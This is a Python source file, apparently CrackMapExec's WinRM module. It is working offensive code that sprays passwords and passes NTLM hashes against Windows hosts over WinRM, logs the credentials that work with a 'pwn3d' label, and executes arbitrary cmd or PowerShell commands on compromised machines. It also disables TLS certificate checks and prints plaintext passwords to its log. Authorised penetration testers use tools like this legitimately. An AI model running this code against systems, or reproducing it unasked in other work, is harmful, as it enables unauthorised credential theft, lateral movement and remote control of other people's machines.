
import requests
import logging
import configparser
from impacket.smbconnection import SMBConnection, SessionError
from cme.connection import *
from cme.helpers.logger import highlight
from cme.helpers.bloodhound import add_user_bh
from cme.logger import CMEAdapter
from io import StringIO
from pypsrp.client import Client

# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SuppressFilter(logging.Filter):
    # remove warning https://github.com/diyan/pywinrm/issues/269
    def filter(self, record):
        return 'wsman' not in record.getMessage()

class winrm(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        winrm_parser = parser.add_parser('winrm', help="own stuff using WINRM", parents=[std_parser, module_parser])
        winrm_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        winrm_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        winrm_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        winrm_parser.add_argument("--port", type=int, default=0, help="Custom WinRM port")
        dgroup = winrm_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        cgroup = winrm_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
        cgroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
        cgroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')

        return parser

    def proto_flow(self):
        self.proto_logger()
        if self.create_conn_obj():
            self.enum_host_info()
            self.print_host_info()
            if self.login():
                if hasattr(self.args, 'module') and self.args.module:
                    self.call_modules()
                else:
                    self.call_cmd_args()

    def proto_logger(self):
        self.logger = CMEAdapter(extra={'protocol': 'SMB',
                                        'host': self.host,
                                        'port': 'NONE',
                                        'hostname': 'NONE'})

    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.domain:
            self.domain = self.args.domain
            self.logger.extra['hostname'] = self.hostname
        else:
            try:
                smb_conn = SMBConnection(self.host, self.host, None)
                try:
                    smb_conn.login('', '')
                except SessionError as e:
                    if "STATUS_ACCESS_DENIED" in e.message:
                        pass

                self.domain = smb_conn.getServerDNSDomainName()
                self.hostname = smb_conn.getServerName()
                self.server_os = smb_conn.getServerOS()
                self.logger.extra['hostname'] = self.hostname

                try:
                    smb_conn.logoff()
                except:
                    pass

            except Exception as e:
                logging.debug("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

    def print_host_info(self):
        if self.args.domain:
            self.logger.extra['protocol'] = "HTTP"
            self.logger.info(self.endpoint)
        else:
            self.logger.extra['protocol'] = "SMB"
            self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os,
                                                                    self.hostname,
                                                                    self.domain))
            self.logger.extra['protocol'] = "HTTP"
            self.logger.info(self.endpoint)
        self.logger.extra['protocol'] = "WINRM"
        

    def create_conn_obj(self):

        endpoints = [
            'https://{}:{}/wsman'.format(self.host, self.args.port if self.args.port else 5986),
            'http://{}:{}/wsman'.format(self.host, self.args.port if self.args.port else 5985)
        ]

        for url in endpoints:
            try:
                requests.get(url, verify=False, timeout=3)
                self.endpoint = url
                if self.endpoint.startswith('https://'):
                    self.port = self.args.port if self.args.port else 5986
                else:
                    self.port = self.args.port if self.args.port else 5985

                self.logger.extra['port'] = self.port

                return True
            except Exception as e:
                if 'Max retries exceeded with url' not in str(e):
                    logging.debug('Error in WinRM create_conn_obj:' + str(e))

        return False

    def plaintext_login(self, domain, username, password):
        try:
            from urllib3.connectionpool import log
            log.addFilter(SuppressFilter())
            self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(domain, username),
                                        password=password,
                                        ssl=False)

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                       username,
                                                       password,
                                                       highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            add_user_bh(self.username, self.domain, self.logger, self.config) 
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            if "with ntlm" in str(e): 
                self.logger.error(u'{}\\{}:{}'.format(self.domain,
                                                        username,
                                                        password))
            else:
                self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
                                                        username,
                                                        password,
                                                        e))

            return False

    def hash_login(self, domain, username, ntlm_hash):
        try:
            from urllib3.connectionpool import log
            log.addFilter(SuppressFilter())
            lmhash = '00000000000000000000000000000000:'
            nthash = ''

            #This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(':') != -1:
                lmhash, nthash = ntlm_hash.split(':')
            else:
                nthash = ntlm_hash
                ntlm_hash = lmhash + nthash

            self.hash = nthash
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash
            self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(domain, username),
                                        password=ntlm_hash,
                                        ssl=False)

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                       username,
                                                       self.hash,
                                                       highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            if "with ntlm" in str(e): 
                self.logger.error(u'{}\\{}:{}'.format(self.domain,
                                                        username,
                                                        self.hash))
            else:
                self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
                                                        username,
                                                        self.hash,
                                                        e))

            return False

    def execute(self, payload=None, get_output=False):
        try:
            r = self.conn.execute_cmd(self.args.execute)
        except:
            self.logger.debug('Cannot execute cmd command, probably because user is not local admin, but powershell command should be ok !')
            r = self.conn.execute_ps(self.args.execute)
        self.logger.success('Executed command')
        self.logger.highlight(r[0])

    def ps_execute(self, payload=None, get_output=False):
        r = self.conn.execute_ps(self.args.ps_execute)
        self.logger.success('Executed command')
        self.logger.highlight(r[0])